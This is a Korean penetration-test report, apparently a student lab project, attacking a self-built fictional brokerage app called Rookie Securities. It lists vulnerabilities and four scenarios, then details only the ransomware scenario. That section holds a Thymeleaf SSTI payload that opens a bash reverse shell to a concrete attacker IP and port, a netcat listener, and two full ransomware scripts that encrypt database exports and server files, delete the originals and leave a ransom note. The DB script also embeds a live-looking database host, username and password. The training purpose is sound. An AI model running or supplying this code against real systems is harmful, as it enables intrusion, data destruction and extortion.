### 루키증권 앱 제작후 시나리오 모의해킹 진행하기.
- 루키증권은 시나리오 모의해킹을 진행하기위해 만든 가상의 증권사 이다.

# 수행 개요
## 수행 목적
- 모의해킹의 목적은 증권 서비스를 하는 루키증권을 앱 대상 블랙박스 모의해킹을 실시하여 효과적인 개선방안을 마련함으로써 정보 시스템들의 보안성과 안전성을 확보하는 데 있다. 이를 위하여 최고의 보안 기술자들로 구성된 모의해킹 전담반에 의한 모의해킹을 수행하여 보안점

## 수행 일정
- 총 7주 동안 인프라 분석, 앱 기능 분석, 취약점 진단, 모의해킹 수행, 보고서 산출 순으로 진행한다.

# 수행 방안
## 점검 도구

- 프록시 : BurpSuite, Frida
- 네트워크 : Nmap, SSH, Netcat
- 악성 앱 : Metasploit Frame work, Apktool

## 취약점 식별

| NO | 점검 항목 | 취약점 내용 | 위험도 |
|---|-------------------|-------|-------|
| 1 | 거래정보 재사용 | 거래정보 갱신이 미흡하여 하나의 거래정보로도 여러 번 거래가 가능한 취약점이 발견됨 | 상 |
| 2 | 프로그램 무결성 검증 | 프로그램을 변조하여 다른 기능들을 사용하거나 악성 앱을 넣어 배포가 가능한 취약점이 발견됨 | 상 |
| 3 | 소스코드 난독화 적용 여부 | 디컴파일(DeCompile) 기술을 이용하여 복구된 소스코드가 읽기 쉽게 되어있어 프로그램 흐름 파악, 중요 정보 획득 등의 악성 행위에 취약할 우려가 있음 | 중 |
| 4 | SQL Injection | 입력 값 검증 미흡으로 인해 사용자가 간섭 가능한 매개변수(URL 파라미터, XML 등)에 의해 SQL 질의문이 완성되어 DB 정보를 추출할 수 있음 | 상 |
| 5 | 파일 업로드 취약점 | 확장자에 대한 검증이 미흡하여 악성 파일이 서버에 업로드 됨 | 상 |
| 6 | 유추 가능한 인증정보 이용 | 회원가입 과정의 인증정보 입력 시 낮은 복잡도 및 취약한 문구 입력이 가능하여 예측 가능한 인증정보를 사용할 수 있어 취약점이 존재함 | 상 |
| 7 | 자동화 공격 | 서버 요청을 여러 번 보낼 때 세션에 대한 검증을 하지 않아 여러 번 보내지는 걸 자동화 도구를 사용하여 시스템의 글쓰기 기능을 이용해 시스템의 자원을 극도로 소모시키는 취약점 존재함 | 상 |
| 8 | 크로스사이트 요청 변조 | 애플리케이션은 각 요청에 고유한 CSRF 토큰을 포함시키는 요청의 유효성을 검증을 하지 않아 다른 서비스에서 유저의 요청을 요구하는 취약점이 발견됨 | 중 |
| 9 | 세션정보 재사용 | 사용자의 세션을 조작하여 다른 사용자로 로그인이 되는 취약점이 발견됨 | 중 |
| 10 | 크로스사이트 스크립팅 | 입력 값에 대한 검증이 미흡하여 악성 스크립트 구문 삽입 및 실행이 가능함 | 중 |
| 11 | 서버 사이드 템플릿 인젝션 | 서버의 템플릿 엔진이 입력값을 적절하게 처리하지 않아 공격자가 서버 측의 템플릿을 조작하여 서버에게 명령을 할 수 있는 취약점이 발견됨 | 상 |


# 결과 요약
## 총평
- 루키증권의 침투 테스트를 수행한 결과, 전반적으로 루키증권의 보안 인프라는 기본적인 보안 요구사항을 충족하고 있습니다. 그러나 개인정보가 포함된 마이페이지 및 공지사항, 커뮤니티 페이지에서 서버 측 템플릿 삽입(SSTI), 크로스 사이트 요청 위조(CSRF), 그리고 SQL 인젝션과 같은 심각한 취약점이 발견되었습니다. 이 보고서는 해당 취약점들로 인해 발생할 수 있는 피해와 그 영향을 상세히 설명합니다. 본 보고서의 발견 사항을 토대로 루키증권의 보안 수준을 강화한다면 안정적인 서비스를 제공할 수 있습니다.

## 모의해킹 시나리오
| NO | 시나리오 제목 | 시나리오 세부 사항 | 수행 방법 |
|----|------------|----------------|-------|
| 1 | 시스템 침투 랜섬웨어 감염 시나리오 | SSTI 취약점을 이용하여 서버 내부로 리버스쉘 접속하는 코드를 주입해서 대상 서버의 정보를 얻은 후 랜섬웨어 코드를 이용해 데이터를 암호화 시도 | １. SSTI 취약점을 이용해 리버스 쉘 접속 코드를 주입 <br> 2. 리버스 커넥션 후 랜섬웨어 코드를 업로드 <br> 3. 랜섬웨어 코드를 통해 db백업하여 저장 후 대상 서버 db 삭제, 서버 중요 정보 암호화 |
| 2 | 코인채굴 시나리오 | Log4j 취약점을 이용하여 Shell 권한을 얻은 ec2에서 엑세스키 탈취한 후 aws cli를 통해 키와 서버를 생성한 후 생성한 서버의 자원을 통해 비트코인 채굴 시도 | 1. log4j 취약점을 이용하여 shell 권한을 얻은 ec2에서 엑세스키 탈취 후 aws cli를 통해 키, ec2 생성 <br> 2. 생성한 ec2에 접속해 비트코인 채굴 돌리는 코드 실행해서 생성된 ec2 자원을 통해 비트코인 채굴 시도 |
| 3 | 금전 취득 시나리오 | CSRF 취약점을 이용해 관리자의 jwt token 탈취 후 관리자만 접근 가능한 공지사항 페이지에 보유 주식 판매 후 강제로 송금이 되게 하는 코드를 기입한 글을 업로드하여 글을 확인한 사용자의 금전 취득 시도 | 1. Q&A 페이지에 JWT Token을 탈취할 수 있는 코드 작성 후 글 게시 <br> 2. 관리자의 JWT Token을 탈취하여 공지사항 페이지에 보유 주식 판매 및 강제 송금이 되는 코드 작성 후 글 게시해 사용자 금전 취득 시도 |
| 4 | 악성 앱 배포를 통한 모바일 탈취 시나리오 | 검색 기능에서 Blind SQL Injection을 통해 관리자의 로그인 정보를 탈취한 후 암호화된 password를 복호화해서 admin 계정 탈취 후 공지사항 페이지에 악성 앱을 배포 해 모바일 장악 시도 | 1. SQL Injection으로 관리자의 로그인 정보 탈취 <br> 2. 레인보우 테이블을 이용한 패스워드 크래킹 <br> 3. 악성 앱 다운로드 유도하는 공지사항 작성 <br> 4. 사용자의 중요 정보 장악 시도 |

# 수행 결과
## S-1 시스템 침투 랜섬웨어 감염 시나리오
### 특정 페이지에서 SSTI 취약점 유무를 확인
- 검색창에 T(java.lang.Runtime).getRuntime().exec(”id")를 입력해서 Thymleaf 구 버전에서 발생하는 SSTI 취약점이 존재함을 확인한다.
><img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/7625f76d-142d-44e0-8248-2350447edada">

### SSTI 취약점을 이용해 리버스 쉘 접속 코드를 주입
- 취약점이 존재하는 부분, 즉 커뮤니티 검색창에 리버스 쉘을 작성하는 코드를 작성하여 서버에서 실행시킨다.
```
T(java.lang.Runtime).getRuntime().exec(new String[] {"sh", "-c","echo '#!/bin/bash\nattacker_ip=51.21.82.80\nattacker_port=8888\n/bin/bash -c /bin/bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1 ' > ReverseShell.sh && chmod a+x ReverseShell.sh && ./ReverseShell.sh"})
```

### 리버스 쉘을 통해 원격으로 접속 후 대상 서버의 정보 수집
- 공격자는 Nc –lnvp 8888 명령어로 netcat을 이용해 8888 포트를 리스닝한다.
> <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/f7515dd2-ff39-40fd-bdf4-4ca4f219f2be">

- 리버스 쉘을 통해 원격으로 대상 서버에 접속하여 정보를 수집한다. 그 후, 서버 정보와 DB연결 정보를 확인한다.

> <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/4630c94f-3092-4d68-af42-9bae47f969ea">

> <img width="456" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/e37bb46b-62be-4440-a5fa-81ee8bc01f13">

### 수집한 정보를 바탕으로 랜섬웨어 코드를 작성
- 수집한 서버, 데이터베이스 정보를 바탕으로 서버 정보를 암호화하고 데이터베이스를 백업해 가져온 후 서버에서 삭제하는 랜섬웨어 코드를 작성한다.

<img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/98ec2acf-bbed-49ae-b7a2-da446fdca63e">

- 다음은 공격에 사용한 DB데이터 랜섬웨어 소스코드이다.
```
#!/bin/bash

# MySQL 데이터베이스 연결 정보
DB_HOST="rds-17-hack.cggbeg5i6y5t.eu-north-1.rds.amazonaws.com"
DB_USER="root"
DB_PASS="k44g20!!"
DB_NAME="rookie"
BACKUP_DIR="$PWD/DBbackupEncrypt"  # 현재 작업 디렉토리의 하위 디렉토리 DBbackup 경로

# 암호화 키
KEY="your_secret_key"

# 데이터 암호화 함수
encrypt_data() {
    local data="$1"
    echo -n "$data" | openssl enc -aes-256-cbc -e -base64 -A -pass pass:$KEY -pbkdf2
}

# 백업 디렉토리 확인 및 생성
if [ ! -d "$BACKUP_DIR" ]; then
    echo "백업 디렉토리가 존재하지 않아 생성합니다: $BACKUP_DIR"
    mkdir -p "$BACKUP_DIR"
fi

# MySQL에 연결하여 각 테이블의 데이터를 CSV 파일로 백업 및 암호화
mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE();" | while read -r table_name; do
    # 각 테이블의 CSV 파일을 미리 생성
    backup_file="$BACKUP_DIR/$table_name.csv"
    touch "$backup_file"

    # 테이블 데이터를 CSV 파일에 백업
    mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT * FROM $table_name" | tr -d '\0' | while read -r line; do
        echo "$line" | awk -v OFS='[king]' '{$1=$1}1' >> "$backup_file"
    done

    # CSV 파일을 읽고 암호화된 파일로 저장 (확장자 king)
    encrypted_file="$backup_file.king"
    while read -r line; do
        encrypted_line=$(encrypt_data "$line")
        echo "$encrypted_line" >> "$encrypted_file"
    done < "$backup_file"

    # 원본 CSV 파일 삭제
    rm "$backup_file"

    echo "테이블 [$table_name] 백업 및 암호화 완료: $encrypted_file"
done

echo "모든 테이블 백업 및 암호화 완료"

```

- 다음은 공격에 사용한 서버 중요정보 랜섬웨어 소스코드이다.

```
#!/bin/bash

FOLDER_PATH=$1
ENCRYPTED_FOLDER_PATH=$1
WARNING_FILE="$ENCRYPTED_FOLDER_PATH/WARNING.txt" # 경고 파일 경로

KEY="your_secret_key"

find "$FOLDER_PATH" -type d | while read DIR; do
    RELATIVE_DIR=$(realpath --relative-to="$FOLDER_PATH" "$DIR")
    mkdir -p "$ENCRYPTED_FOLDER_PATH/$RELATIVE_DIR"
done

find "$FOLDER_PATH" -type f | while read FILE; do
    FILENAME=$(basename "$FILE")
    EXTENSION="${FILENAME##*.}"
    FILENAME="${FILENAME%.*}"
    echo "[암호화] $FILENAME.$EXTENSION"

    RELATIVE_PATH=$(realpath --relative-to="$FOLDER_PATH" "$FILE")

    openssl enc -aes-256-cbc -e -in "$FILE" -out "$ENCRYPTED_FOLDER_PATH/$RELATIVE_PATH.king" -pass pass:$KEY -pbkdf2

    rm "$FILE"
done

echo "암호화가 완료되었습니다."

echo "
해당 디렉토리의 모든 파일은 암호화 되었습니다.
복호화 코드와 Key가 필요합니다.
모의해King팀으로 문의해주세요.
" > "$WARNING_FILE"
```

### 랜섬웨어 코드를 서버에 업로드 
- 일련의 명령어를 통해 netcat을 이용하여 랜섬웨어 코드를 서버에 업로드한다.

> <img width="496" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/de1d73db-fc9b-470e-8fd2-77c23d7fae8f">

> <img width="496" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/b0770176-f650-45e5-b5c3-d935682f9abd">

> <img width="496" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/3aadb3a3-2199-4112-80e2-4287dd011264">

> <img width="496" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/4fd3ce3d-d108-4dd8-8d26-d10c4c39b070">


### 랜섬웨어 코드로 서버 정보 암호화 및 db백업 후 삭제 진행
- 랜섬웨어 코드를 실행하여 서버 정보를 암호화하고 데이터베이스를 백업한 후에, 해당 데이터를 서버에서 삭제한다.

> <img width="475" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/a816d117-5651-4b15-a2ec-db156dc0f1bf">

> <img width="479" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/927332c4-afa4-43cb-bb04-cf37fc8714c6">

- 암호화된 파일 내용
> <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/91be8c6e-88bd-481b-afd0-387b1a79d0eb">

### 랜섬 메시지 남김
- 랜섬웨어 공격을 통해 서버에 페이지를 생성하여 랜섬 메시지를 남긴다. 이를 통해 서버 관리자에게 요구사항을 알리고 사용자들에게 경고를 전달할 수 있다.

> <img width="255" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/8ffef4ca-d9f9-4151-b502-683e41a1957f">


